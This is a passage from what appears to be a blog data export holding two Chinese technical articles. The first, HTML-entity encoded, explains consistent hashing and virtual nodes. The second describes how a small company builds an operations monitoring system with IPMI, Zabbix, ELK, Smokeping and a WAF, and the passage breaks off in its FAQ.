;&#x5668;&#xFF09;&#x7684;&#x5220;&#x9664;<br>&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x5E03;&#x4E3A;&#x4F8B;&#xFF0C;&#x5982;&#x679C;NODE2&#x51FA;&#x73B0;&#x6545;&#x969C;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x6309;&#x7167;&#x987A;&#x65F6;&#x9488;&#x8FC1;&#x79FB;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;object3&#x5C06;&#x4F1A;&#x88AB;&#x8FC1;&#x79FB;&#x5230;NODE3&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x4EC5;&#x4EC5;&#x662F;object3&#x7684;&#x6620;&#x5C04;&#x4F4D;&#x7F6E;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;&#x5176;&#x5B83;&#x7684;&#x5BF9;&#x8C61;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7684;&#x6539;&#x52A8;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/4.png\" alt=\"\"></p>\n</li>\n<li><p>&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x7684;&#x6DFB;&#x52A0;<br>&#x5982;&#x679C;&#x5F80;&#x96C6;&#x7FA4;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8282;&#x70B9;NODE4&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5F97;&#x5230;KEY4&#xFF0C;&#x5E76;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/5.png\" alt=\"\"></p>\n</li>\n</ol>\n<p>&#x901A;&#x8FC7;&#x6309;&#x987A;&#x65F6;&#x9488;&#x8FC1;&#x79FB;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x90A3;&#x4E48;object2&#x88AB;&#x8FC1;&#x79FB;&#x5230;&#x4E86;NODE4&#x4E2D;&#xFF0C;&#x5176;&#x5B83;&#x5BF9;&#x8C61;&#x8FD8;&#x4FDD;&#x6301;&#x8FD9;&#x539F;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x3002;&#x901A;&#x8FC7;&#x5BF9;&#x8282;&#x70B9;&#x7684;&#x6DFB;&#x52A0;&#x548C;&#x5220;&#x9664;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5728;&#x4FDD;&#x6301;&#x4E86;&#x5355;&#x8C03;&#x6027;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x8FD8;&#x662F;&#x6570;&#x636E;&#x7684;&#x8FC1;&#x79FB;&#x8FBE;&#x5230;&#x4E86;&#x6700;&#x5C0F;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x5BF9;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x6765;&#x8BF4;&#x662F;&#x975E;&#x5E38;&#x5408;&#x9002;&#x7684;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x5927;&#x91CF;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#xFF0C;&#x51CF;&#x5C0F;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7684;&#x538B;&#x529B;&#x3002;</p>\n<h3 id=\"&#x5E73;&#x8861;&#x6027;\"><a href=\"#&#x5E73;&#x8861;&#x6027;\" class=\"headerlink\" title=\"&#x5E73;&#x8861;&#x6027;\"></a>&#x5E73;&#x8861;&#x6027;</h3><p>&#x6839;&#x636E;&#x4E0A;&#x9762;&#x7684;&#x56FE;&#x89E3;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x6EE1;&#x8DB3;&#x4E86;&#x5355;&#x8C03;&#x6027;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x7279;&#x6027;&#x4EE5;&#x53CA;&#x4E00;&#x822C;hash&#x7B97;&#x6CD5;&#x7684;&#x5206;&#x6563;&#x6027;&#xFF0C;&#x4F46;&#x8FD9;&#x8FD8;&#x5E76;&#x4E0D;&#x80FD;&#x5F53;&#x505A;&#x5176;&#x88AB;&#x5E7F;&#x6CDB;&#x5E94;&#x7528;&#x7684;&#x539F;&#x7531;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD8;&#x7F3A;&#x5C11;&#x4E86;&#x5E73;&#x8861;&#x6027;&#x3002;&#x4E0B;&#x9762;&#x5C06;&#x5206;&#x6790;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x662F;&#x5982;&#x4F55;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x6027;&#x7684;&#x3002;hash&#x7B97;&#x6CD5;&#x662F;&#x4E0D;&#x4FDD;&#x8BC1;&#x5E73;&#x8861;&#x7684;&#xFF0C;&#x5982;&#x4E0A;&#x9762;&#x53EA;&#x90E8;&#x7F72;&#x4E86;NODE1&#x548C;NODE3&#x7684;&#x60C5;&#x51B5;&#xFF08;NODE2&#x88AB;&#x5220;&#x9664;&#x7684;&#x56FE;&#xFF09;&#xFF0C;object1&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE1&#x4E2D;&#xFF0C;&#x800C;object2&#x3001;object3&#x3001;object4&#x90FD;&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE3&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x7167;&#x6210;&#x4E86;&#x975E;&#x5E38;&#x4E0D;&#x5E73;&#x8861;&#x7684;&#x72B6;&#x6001;&#x3002;<strong>&#x5728;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x6EE1;&#x8DB3;&#x5E73;&#x8861;&#x6027;&#xFF0C;&#x5176;&#x5F15;&#x5165;&#x4E86;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x3002;</strong></p>\n<p>&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#xFF08; virtual node &#xFF09;&#x662F;&#x5B9E;&#x9645;&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x5728; hash &#x7A7A;&#x95F4;&#x7684;&#x590D;&#x5236;&#x54C1;&#xFF08; replica &#xFF09;&#xFF0C;&#x4E00;&#x5B9E;&#x9645;&#x4E2A;&#x8282;&#x70B9;&#xFF08;&#x673A;&#x5668;&#xFF09;&#x5BF9;&#x5E94;&#x4E86;&#x82E5;&#x5E72;&#x4E2A;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x5E94;&#x4E2A;&#x6570;&#x4E5F;&#x6210;&#x4E3A;&#x201C;&#x590D;&#x5236;&#x4E2A;&#x6570;&#x201D;&#xFF0C;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x5728; hash &#x7A7A;&#x95F4;&#x4E2D;&#x4EE5;hash&#x503C;&#x6392;&#x5217;&#x3002;</p>\n<p>&#x4EE5;&#x4E0A;&#x9762;&#x53EA;&#x90E8;&#x7F72;&#x4E86;NODE1&#x548C;NODE3&#x7684;&#x60C5;&#x51B5;&#xFF08;NODE2&#x88AB;&#x5220;&#x9664;&#x7684;&#x56FE;&#xFF09;&#x4E3A;&#x4F8B;&#xFF0C;&#x4E4B;&#x524D;&#x7684;&#x5BF9;&#x8C61;&#x5728;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#x5F88;&#x4E0D;&#x5747;&#x8861;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x4EE5;2&#x4E2A;&#x526F;&#x672C;&#xFF08;&#x590D;&#x5236;&#x4E2A;&#x6570;&#xFF09;&#x4E3A;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x6574;&#x4E2A;hash&#x73AF;&#x4E2D;&#x5C31;&#x5B58;&#x5728;&#x4E86;4&#x4E2A;&#x865A;&#x62DF;&#x8282;&#x70B9;&#xFF0C;&#x6700;&#x540E;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x7684;&#x5173;&#x7CFB;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/6.png\" alt=\"\"></p>\n<p>&#x6839;&#x636E;&#x4E0A;&#x56FE;&#x53EF;&#x77E5;&#x5BF9;&#x8C61;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF1A;object1-&gt;NODE1-1&#xFF0C;object2-&gt;NODE1-2&#xFF0C;object3-&gt;NODE3-2&#xFF0C;object4-&gt;NODE3-1&#x3002;&#x901A;&#x8FC7;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x5BF9;&#x8C61;&#x7684;&#x5206;&#x5E03;&#x5C31;&#x6BD4;&#x8F83;&#x5747;&#x8861;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x5728;&#x5B9E;&#x9645;&#x64CD;&#x4F5C;&#x4E2D;&#xFF0C;&#x6B63;&#x771F;&#x7684;&#x5BF9;&#x8C61;&#x67E5;&#x8BE2;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#x5462;&#xFF1F;&#x5BF9;&#x8C61;&#x4ECE;hash&#x5230;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x5230;&#x5B9E;&#x9645;&#x8282;&#x70B9;&#x7684;&#x8F6C;&#x6362;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C/7.png\" alt=\"\"></p>\n<p>&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x7684;hash&#x8BA1;&#x7B97;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x5BF9;&#x5E94;&#x8282;&#x70B9;&#x7684;IP&#x5730;&#x5740;&#x52A0;&#x6570;&#x5B57;&#x540E;&#x7F00;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x4F8B;&#x5982;&#x5047;&#x8BBE;NODE1&#x7684;IP&#x5730;&#x5740;&#x4E3A;192.168.1.100&#x3002;&#x5F15;&#x5165;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x524D;&#xFF0C;&#x8BA1;&#x7B97; cache A &#x7684; hash &#x503C;&#xFF1A;<br>Hash(&#x201C;192.168.1.100&#x201D;);<br>&#x5F15;&#x5165;&#x201C;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x201D;&#x540E;&#xFF0C;&#x8BA1;&#x7B97;&#x201C;&#x865A;&#x62DF;&#x8282;&#x201D;&#x70B9;NODE1-1&#x548C;NODE1-2&#x7684;hash&#x503C;&#xFF1A;<br>Hash(&#x201C;192.168.1.100#1&#x201D;); // NODE1-1<br>Hash(&#x201C;192.168.1.100#2&#x201D;); // NODE1-2</p>\n<hr>\n<h3 id=\"&#x603B;&#x7ED3;\"><a href=\"#&#x603B;&#x7ED3;\" class=\"headerlink\" title=\"&#x603B;&#x7ED3;\"></a>&#x603B;&#x7ED3;</h3><p>&#x76EE;&#x524D;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x57FA;&#x672C;&#x6210;&#x4E3A;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7EC4;&#x4EF6;&#x7684;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;Memcached&#x7684;&#x5404;&#x79CD;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x63D0;&#x4F9B;&#x5185;&#x7F6E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x652F;&#x6301;&#x3002;&#x672C;&#x6587;&#x53EA;&#x662F;&#x7B80;&#x8981;&#x4ECB;&#x7ECD;&#x4E86;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#xFF0C;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x53C2;&#x770B;&#x8BBA;&#x6587;&#x300A;<a href=\"http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf\">Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web</a>&#x300B;&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;<a href=\"http://www.codeproject.com/KB/recipes/lib-conhash.aspx\">C&#x8BED;&#x8A00;&#x7248;&#x672C;</a>&#x7684;&#x5B9E;&#x73B0;&#x4F9B;&#x53C2;&#x8003;&#x3002;</p>"},{"title":"中小企业监控体系构建实战","date":"2016-06-08T05:15:12.000Z","toc":false,"_content":"\n> 文章整理如下：\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/1.png)\n\n<!-- more -->\n\n---\n\n## 作者介绍\n\n赵舜东，江湖人称赵班长，曾在武警某部负责指挥自动化的架构和运维工作，2008年退役后一直从事互联网运维工作。曾带团队负责国内某食品电商的运维工作，即将出版的《saltstack入门与实践》作者之一。\n\n## 主题简介\n\n我们今天的话题是《中小企业监控体系构建实战》，前期分享了《中小企业自动化部署实战》还没有看到的朋友可以先阅读下，这样也能明白为何要定位中小企业。监控这个话题实在太大，所以本文的正确定位应该是如何构建一个“相对”完善的监控体系。\n\n## 从面试开始\n\n在之前的招聘面试中，我必问的一个问题就是“**你们之前公司的监控体系是怎么做的？你认为怎么做效果比较好？**”\n\n经常得到这样类似的答案：“我们公司用的Nagios、Cacti做监控，或者说我们公司用Zabbix做监控”，再继续追问往往得到的也是如何使用这些工具的细节的回答。\n\n这样的回答固然没错，但却反映出来运维人员经常会被工具迷惑双眼，从而忘记了最初的出发点。本文就以一个刚入职的运维工程师小王的故事来阐述监控体系，所以这个故事的名字叫做《小王特烦恼》。\n\n### 1. 确定目标、统一思想\n\n我们直接跳过什么是监控和监控的重要性等大段描述，先仔细的想一想，监控的目标是什么？\n\n每个人的答案都不同，我的回答是：终极目标就是为了保证业务的持续和稳定运行。如此偏激的回答就是让读者从现在开始要站在业务的角度的开始规划监控体系，而不是某个技术范畴。\n\n注意：本文不涉及性能测试、性能优化中的监控，所有文字的出发点都是日常运维监控。\n\n在开始之前，我们还是先统一下认识：要监控一个对象，需要掌握哪些东西呢？\n\n- 监控对象的理解：要监控的对象你是否了解呢？比如CPU到底是如何工作的？\n\n- 监控对象的指标：我们要监控这个东西的什么属性？比如CPU的CPU使用率、负载、上下文切换。\n\n- 确定报警基准线：怎么样才算是故障，要报警呢？比如CPU的负载到底多少算高？\n\n如果上述的条件不满足，那就先不要开始实施监控了，因为等做完了，你会发现，然并卵？\n\n### 2. 故事开始\n\n王小明（化名）刚刚毕业，到了一家刚刚起步的电商公司任职：运维工程师，刚上班第一天，小王收到领导安排的光荣任务:把我们公司的监控搞起来！\n\n小王想了好久，没想明白，索性不想了，从手头接触到的慢慢开始吧,于是小王决定先去机房看看。\n\n#### 2.1 硬件监控\n\n到了机房，小王看着公司的各种品牌的服务器，想到的第一件事情就是，这些硬件设备，我要监控起来。\n\n硬件设备监控是最基础的监控手段，比如定期的的机房巡检。\n\n通常我们的服务器上都会有远程控制卡，如Dell的iDRAC,HP的ILO和IBM的IMM等，可以通过Web界面来进行硬件的监控和管理工作，如果购买企业级的授权，还可以使用控制台进行管理。\n\n在Linux下，通常我们使用IPMI来完成物理设备的监控工作。通常必须要监控的就是温度、硬盘故障等。\n\n小王编写了自己职业生涯的第一个脚本，就是使用ipmi工具获取温度传感器的数据，大于50就发一份邮件给他，虽然感觉不高端，但总算是有一个开始。\n\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/2.png)\n\n故障回想：之前我司托管在北京某机房的设备就出现过，因为刚好所在机柜区域的空调坏了，导致服务器温度过高，然后系统宕机。\n\n#### 2.2 系统监控\n\n小王下一个想到的就是系统监控，公司全是Linux的服务器，系统资源的使用情况，肯定是要监控起来的。\n\n系统监控是监控体系的基础，系统监控主要的对象有：\n\n1、CPU\n2、Memory\n3、IO\n4、CPU：关于CPU，有3个重要的概念：上下文切换（context switchs），运行队列（Run queue）和使用率（utilization）。\n\n这也是我们CPU监控的三个重点。通常情况下，每个处理器的运行队列要小于等于3，CPU 利用率中user/system比例维持在70/30，上下文切换要根据系统繁忙程度来综合考量。\n\n常用的监控工具有：top vmstat mpstat\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/3.png)\n\n内存：Linux虚拟内存是一个庞大的东东，通常我们需要监控内存的使用率、SWAP使用率、同时可以通过内存的使用率曲线来发现某些服务的内存溢出等。\n\n监控工具有：free vmstat\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/4.png)\n\nIO：IO分为磁盘IO和网络IO。除了在做性能调优我们要监控更详细的数据外，那么日常监控，只关注磁盘使用率、io wait即可，网络也是监控网卡流量即可。工具有iostat iotop iftop。\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/5.png)\n\nTCP监控：在很多情况下有必要监控TCP的状态，可以使用netstat或者ss来获取所有的TCP连接，来展现11种不同的TCP连接状态的数量，可以在大并发中及时发现TCP的相关故障。\n\n![图片6](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/6.png)\n\n其它的系统监控还有运行的进程数、登陆用户、Open File等。\n\n#### 2.3 应用服务监控\n\n小王把硬件监控和系统监控研究明白后，登陆到服务器上继续研究，偶然间一个ps aux，小王发现，我们服务器上运行了这么多的服务，那都需要监控起来啊。\n\n应用服务监控也是监控体系中比较重要的内容，例如：\n\nApache：Apache提供了mod_status和mod_info模块用来输出Apache的状态，小王写了一个脚本，各种grep和awk搞定。\nNginx：同样有状态模块，编译的时候加上—with-http_stub_status_module，然后就可以使用stub_status on来开启了。\nMemcached：小王使用nc给memcached发送了一个stats命令就获取到了所有想要的信息。\nRedis：小王还是使用nc给redis发送了一个info命令就获取到了redis的相关状态。\nJVM：使用jmconsole，或者jmx就可以进行远程监控。\n于是小王，将线上的各种服务，都一个一个的进行了监控，这样这些服务的详细的运行状态就了如指掌了。\n\n同时，还需要将所有的API接口状态进行监控，比如通过curl检查返回的HTTP状态码。有条件的用户，可以做一个URL监控平台，专门用来做这个事情。\n\n![图片7](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/7.png)\n\n#### 2.4 引入Zabbix\n\n自从小王接收到监控的任务后，这Shell编程能力是越来越强了，但是每天一打开邮箱就被各种报警所淹没，脚本多而杂乱。\n\n小王想，我需要一个什么监控工具来干这些事，不能这么写脚本下去了。于是在网上进行各种搜索，发现了很多的监控工具如Nagios、Cacti、Zabbix，原来自己之前费那么大劲，这些工具早就实现了。\n\n经过相关的对比，小王选择了Zabbix。然后之前的所有监控范畴，都可以整合到Zabbix中。\n\n硬件监控：Zabbix IPMI Interface\n系统监控：Zabbix Agent Interface\nJava监控：Zabbix JMX Interface\n网络设备监控：Zabbix SNMP Interface\n应用服务监控：Zabbix Agent UserParameter\nMySQL数据库监控：percona-monitoring-plulgins\nURL监控：Zabbix Web 监控  \n\n这一下子把之前干的工作全集成到一个平台上了。而且之前编写的所有的应用服务的监控脚本，简单修改就可以使用。\n\n同时也可以灵活的设置报警阈值、告警方式、告警升级、告警去重、告警依赖等等，同时还使用Zabbix的自动发现功能实现上线一台服务器后，自动添加监控。\n\n使用Zabbix Proxy实现了多机房的分布式监控，这简直太棒了。\n\n对于告警通知：邮件、微信、短信、钉钉等，都可以与Zabbix快速的集成，网上有很多此类文档。\n\n同时，针对某些可以进行直接处理的报警，Zabbix可以触发Action来轻松帮你实现，故障的自动处理。\n\n于是小王准备向经理汇报工作，此处省略300字，但是不到10分钟小王垂直头回来了。因为经理问了一个问题，小王回答不上来：小王，今天咱们网站的整体PV是多少？现在访问最多的页面是哪个？\n\n#### 2.5 流量分析\n\n小王首先想到的是把访问日志拿出来各种awk然后sort一下，但是这次他没有急于开始，难道就没有做这些统计和分析的工具吗？\n\n于是小王发现了google分析、百度统计、站长工具等等一堆统计的东西，只需要在页面嵌入一个js即可。\n\n但是呢？这个数据始终是在对方那里，而且功能定制起来也不方便，于是google帮助了他，一个叫做piwik的开源项目映入眼帘。\n\n网站流量分析对于运维人员来说，更是一门必须掌握的知识了。比如对于一家电商公司来说，通过对订单来源的统计和分析，可以了解我们在某个网站上的广告投入有没有收到预期的效果。可以区分不同地区的访问人数、甚至商品交易额等。\n\n![图片8](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/8.png)\n\n而且，流量分析是运维向运营拓展的必经之路，作为一名运维工程师很有必要掌握公司站点的各种访问详情。\n\n#### 2.6 网络监控\n\n作为一个针对全国用户的电商网站，时刻掌握各地到机房的网络状态是小王的下一个监控目标。\n\n网络监控是我们构建监控平台是必须要考虑的，尤其是针对有多个机房的场景，各个机房之间的网络状态，机房和全国各地的网络状态都是我们需要重点关注的对象，那么如何掌握这些状态信息呢？我们需要借助于网络监控工具Smokeping。\n\nSmokeping 是rrdtool的作者Tobi Oetiker的作品，是用Perl写的，主要是监视网络性能，www 服务器性能，dns查询性能等，使用rrdtool绘图，而且支持分布式，直接从多个agent进行数据的汇总。\n\n同时，由于自己监控点比较少，还可以借助很多商业的监控工具，比如监控宝、基调、博瑞等。同时这些服务提供商还可以帮助你监控CDN的状态。\n\n![图片9](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/9.png)\n\n#### 2.7 安全监控\n\n虽然iptables帮助小王完成了四层的安全防护，但是针对七层的Web层面怎么办呢？\n\n于是小王使用Nginx + Lua编写了一个WAF，然后把相关的日志记录到了Elasticsearch中，通过kibana可以图形化的展示不同的攻击类型的统计。\n\n同时小王学习使用python还写了一个爬虫定期扫描github，有没有公司相关的关键字，以免同事分享代码时，不小心涉及到敏感的内容。\n\n![图片10](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/10.png)\n\n（图片来源https://github.com/loveshell/ngx_lua_waf）\n\n#### 2.8 业务监控\n\n小王再去向经理汇报，刚走到门口被总经理碰上了，张总说：小王啊，你们经理汇报你最近监控工作干的不错，你给我说下，咱们现在10点的时候总订单是多少，每分钟平均订单有多少？\n\n小王又蒙了，我自己也曾经就是那个小王！\n\n没有业务指标监控的监控平台是一个不完善的监控平台，通常在我们做监控系统中，必须将我们重要的业务指标进行监控，并设置阈值进行告警通知。\n\n比如每分钟的订单、每分钟注册、日活用户、短信使用量等重要的业务指标都可以加入到Zabbix上。\n\n注：由于业务监控图表，涉及到隐私的数据太多，就不截图了。\n\n#### 2.9 日志监控\n\n通常情况下，系统会产生系统日志、应用程序会有应用的访问日志、错误日志，服务有运行日志等，可以使用ELK来进行日志监控。\n\n对于日志来说，最常见的需求就是收集、存储、查询、展示，开源社区正好有相对应的开源项目：\n\nlogstash（收集）\nelasticsearch（存储+搜索）\nkibana（展示）\n我们将这三个组合起来的技术称之为ELK Stack，所以说ELK Stack指的是Elasticsearch、Logstash、Kibana技术栈的结合。\n\n如果收集了错误日志，那么如果部署更新有异常出现，可以立即在kibana上看到。当然也可以使用Zabbix来进行错误日志的过滤来进行告警。\n\n![图片11](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/11.png)\n\n#### 2.10 自动化\n\n经过努力，小王完成从监控菜鸟到头脑中有一个相对完整的监控体系的逆袭，但是在大规模的环境中，如果无法做到自动化监控，那么手动添加监控不仅仅是一个恐怖的工作，而且也无法保证完整性。\n\n自动化的方案有很多，通常有主动和被动不同的形式，这里相对Zabbix来说。\n\n主动形式：\n\n比如使用Zabbix的自动发现，主动的对全网进行扫描，然后自动添加相关的监控服务器和引用监控模板。\n\n被动形式：\n\n也可以使用Zabbix API进行被动的监控的添加。比如以CMDB为核心，如果检测到某服务器增加了Nginx服务，那么自动调用Zabbix API添加上Nginx的监控模板。\n\n真正想做到更完整的监控体系，目前的开源软件，确实无法很好的满足，有条件的公司都开始自己开发自己的监控系统，比如小米开源的Open-Falcon。\n\n也有比较好的开源的监控框架如Sensu等，再加上influxdb grafana可以用来定制符合自己企业的监控平台。\n\n#### 2.11 可视化\n\n经过小王的各种努力，终于一个相对完善的监控平台使用Zabbix构建起来了，小王为此还做一个漂亮的screen，来进行展示，但是有一天突然订单量特别少，张总又一次到了运维部，但失望而归，因为整个监控体系并不能反映出来订单量为什么减少了？\n\n运维的重要目标之一就是数据的可视化，一个监控平台不能很好的反映出来业务的波动，就是耍流氓。之前的一切努力在业务部门的领导中变得一文不值！！！\n\n我们能做的有以下几点：\n\n面向传统运维：\n\n尽可能的完善业务监控，如果有专门的业务分析系统，要想办法和运维的监控平台进行结合。\n\n梳理清楚各个子系统之间和业务的关系，比如如果突然间流量增加了50M，能够快速的知道这50M流量到了那个业务系统上，访问的哪些URL，以及这个业务系统的相关状态。\n\n面向DevOps：\n\n将所有的监控项和业务之间建立关系树，比如业务、网络、系统、数据库、流量、推广活动（流量分析）之间可以形成一个庞大的关系链。这是一个比较庞大的工程，业务是多变的，如何让监控平台能尽可能的适应多变的业务是一个艰巨的任务。\n\n![图片12](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/12.png)\n\n## 到面试结束\n\n该结束了，因为我无论怎么努力增加，还是觉得总有漏下的。\n\n监控的话题还有很多很多，比如还有和运维相关的页面性能监控（页面资源数量、DNS解析时间、首屏时间、加载最慢的资源、产生阻塞的JS等）、代码监控、与运维无关的舆论监控等，先这么多吧！\n\n好的，我们是从面试开始引入的监控的话题，那么就从面试结束吧！下次再遇到类似的面试题，我相信读者心里一定有了自己的答案，这里就不在详述，一个相对完善的运维监控体系是否已经在你脑海中形成了呢？\n\n> 小贴士：面试中，如果你遇到一个有很强的责任心，连洗澡都要带上手机，以免错过报警的人，不要犹豫，先招进来再慢慢培养吧。责任心是运维工程师的第一要素！\n\n后记：小王的故事结束了，小王目前被监控的关系树锻炼的连王菲、李亚鹏的关系都能搞明白了。可是你呢？\n\n如果你是一名运维工程师，动手干吧，监控会是一个不断完善的工程，这就是运维（运营）和项目的本质区别。\n\n如果你是一名Devops，那么开始编程吧！\n\n如果你是一名老板，给公司的运维工程师一个转变的机会和一些时间，人总是不断进步的！\n\n## FAQ：\n\n### 故障自动处理有没有相关的思路？\n\n不同业务形态、不同架构、不同服务可能采用的方式都不同，这个没有一个固定的东西分享。可以参考之前腾讯蓝鲸的分享，他们实现了故障自愈的功能。\n\n### 